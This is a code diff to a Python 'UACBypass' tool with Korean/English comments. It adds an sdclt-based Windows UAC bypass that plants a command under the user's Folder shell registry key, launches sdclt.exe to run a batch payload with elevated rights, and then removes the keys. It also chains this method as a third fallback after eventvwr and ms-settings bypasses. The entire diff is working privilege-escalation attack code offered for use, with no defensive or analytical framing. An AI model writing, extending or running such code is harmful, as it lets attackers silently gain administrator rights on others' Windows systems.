@@ -160,6 +160,42 @@ class UACBypass:
             self.cleanup()
             return False
     
+    def sdclt(self, payload_command): # sdclt 우회 | sdclt bypass
+        print("[+] running sdclt method")
+        
+        try:
+            base_key = "Software\\Classes\\Folder"
+            command_key = f"{base_key}\\shell\\open\\command"
+            
+            print("[+] setting up registry for sdclt")
+            
+            if not self.write_reg(command_key, "DelegateExecute", ""): # DelegateExecute 설정
+                print("[!] failed to set DelegateExecute")
+                return False
+            
+            payload_file = self.make_bat(payload_command, keep_open=True)
+            
+            cmd_line = f'cmd.exe /c "{payload_file}"'
+            if not self.write_reg(command_key, None, cmd_line):
+                print("[!] failed to set command")
+                return False
+            
+            print("[+] running sdclt")
+            sdclt_path = os.path.join(os.environ['WINDIR'], 'System32', 'sdclt.exe')
+            
+            subprocess.Popen(sdclt_path, shell=True)
+            
+            print("[+] waiting for execution")
+            time.sleep(5)
+            
+            self.cleanup()
+            return True
+            
+        except Exception as e:
+            print(f"[!] sdclt failed: {e}")
+            self.cleanup()
+            return False
+    
     def cleanup(self): # 정리 clean up
         print("[+] cleaning up")
         
@@ -167,7 +203,11 @@ class UACBypass:
             "Software\\Classes\\ms-settings\\shell\\open\\command",
             "Software\\Classes\\ms-settings\\shell\\open", 
             "Software\\Classes\\ms-settings\\shell",
-            "Software\\Classes\\ms-settings"
+            "Software\\Classes\\ms-settings",
+            "Software\\Classes\\Folder\\shell\\open\\command",
+            "Software\\Classes\\Folder\\shell\\open",
+            "Software\\Classes\\Folder\\shell",
+            "Software\\Classes\\Folder"
         ]
         
         for path in cleanup_paths:
@@ -205,6 +245,10 @@ def main():
     if not success:
         print("[!] method 1 failed - trying method 2")
         success = bypass.eventvwr(payloads[1])
+        
+    if not success:
+        print("[!] method 2 failed - trying method 3")
+        success = bypass.sdclt(payloads[2])
     
     if success:
         print("[✓] UAC bypass successfully completed!")
